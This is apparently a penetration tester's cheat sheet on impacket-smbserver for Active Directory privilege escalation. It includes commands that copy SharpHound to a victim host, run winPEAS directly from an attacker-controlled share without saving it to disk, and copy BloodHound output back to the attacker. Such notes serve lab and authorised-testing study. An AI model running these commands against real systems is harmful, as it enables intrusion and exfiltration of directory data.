Use -smb2support to avoid error below:
impacket-smbserver share ./ -smb2support

Use -smb2support -user vk9guest -pass ‘’ to avoid the previous, and following error:
impacket-smbserver share ./ -smb2support -user test -pass '' 

impacket-smbserver share ./ -smb2support -user test -pass ''
Login like this if you've encountered the previous errors:
net use \\192.168.119.231\share /USER:test

Copy file from attacking machine to victim:
copy \\192.168.119.168\share\SharpHound.exe

Run binary through the smbshare without saving binary on disk:
\\192.168.119.168\share\winPEASany.exe

Copy files from victim to our share on attacking machine:
copy 20220424074629_BloodHound.zip \\192.168.119.213\share

Disconnect all shares:
net use * /del /y
![unnamed_dc8abdc75c124f289508e6fe080dc18e](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Enumeration/General%20impacket%20syntax/smbserver/{{notename}}-202605011506.png)
![unnamed_49c4079fa0134effb748e9db451d4dd6](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Enumeration/General%20impacket%20syntax/smbserver/{{notename}}-202605011506-1.png)
![unnamed_a5e9d885a9d242c2bd6ad6f9575646c1](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Enumeration/General%20impacket%20syntax/smbserver/{{notename}}-202605011506-2.png)